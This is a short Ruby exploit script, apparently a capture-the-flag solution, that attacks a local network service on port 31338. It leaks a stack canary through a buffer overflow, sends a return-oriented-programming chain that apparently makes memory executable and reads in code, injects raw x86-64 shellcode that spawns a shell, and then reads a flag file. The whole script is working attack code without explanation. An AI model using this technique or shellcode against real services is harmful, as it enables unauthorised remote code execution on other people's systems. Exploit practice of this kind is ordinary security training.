require 'pwn'

context.log_level = :debug

z = Sock.new '0.0.0.0', 31338
z.write "A"*0x18 + "B"
z.recvuntil "B"

canary = z.recv(7)
canary = u64("\x00" + canary)

payload = "A"*0x18
payload += p64(canary)
payload += "B"*0x8
payload += p64(0x4005d5)
payload += p64(0x6cf000)
payload += p64(0x4017f7)
payload += p64(0x1000)
payload += p64(0x443776)
payload += p64(0x7)

payload += p64(0x440e60)

payload += p64(0x4005d5)
payload += p64(0x0)
payload += p64(0x4017f7)
payload += p64(0x6cf460)
payload += p64(0x443776)
payload += p64(0x20)

payload += p64(0x440300)

payload += p64(0x6cf460)

z.send(payload)

sleep(0.3)
z.send("exit\n")
sleep(0.3)

print z.recv(1024)
print z.recv(1024)
z.send("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

z.send("cat /home/start/flag\n")

print z.recv(1024)
print z.recv(1024)
print z.recv(1024)
